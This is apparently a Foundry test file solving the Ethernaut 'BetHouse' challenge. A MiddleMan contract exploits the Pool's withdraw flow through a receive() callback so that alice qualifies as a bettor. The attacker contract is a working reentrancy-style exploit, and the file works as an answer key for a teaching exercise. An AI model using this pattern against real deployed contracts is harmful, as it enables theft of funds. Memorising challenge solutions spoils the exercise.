// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/BetHouse.sol";

contract MiddleMan {
    PoolToken wrappedToken;
    address owner;

    receive() external payable {
        wrappedToken.transfer(owner, wrappedToken.balanceOf(address(this)));
    }

    function attack(address prey, uint256 value) public payable {
        Pool pool = Pool(prey);
        wrappedToken = PoolToken(pool.wrappedToken());
        owner = msg.sender;

        PoolToken depositToken = PoolToken(pool.depositToken());

        depositToken.approve(prey, type(uint256).max);

        pool.deposit{value: msg.value}(value);
        pool.withdrawAll();

        pool.deposit(value);
        wrappedToken.transfer(owner, wrappedToken.balanceOf(address(this)));
    }
}

contract BetHouseTest is Test {
    BetHouse instance;
    PoolToken wrappedToken;
    PoolToken depositToken;
    Pool pool;
    address alice = makeAddr("alice");

    function setUp() public {
        wrappedToken = new PoolToken("wrappedToken", "WT");
        depositToken = new PoolToken("depositToken", "DT");
        pool = new Pool(address(wrappedToken), address(depositToken));
        instance = new BetHouse(address(pool));

        depositToken.mint(alice, 5);

        depositToken.transferOwnership(address(pool));
        wrappedToken.transferOwnership(address(pool));
    }

    function test() public {
        assertEq(instance.isBettor(alice), false);

        uint256 depositValue = 0.001 ether;
        vm.deal(alice, depositValue);

        MiddleMan middleMan = new MiddleMan();
        vm.startPrank(alice);
        depositToken.transfer(address(middleMan), 5);

        middleMan.attack{value: depositValue}(address(pool), 5);

        pool.lockDeposits();
        instance.makeBet(alice);

        assertEq(instance.isBettor(alice), true);
    }
}
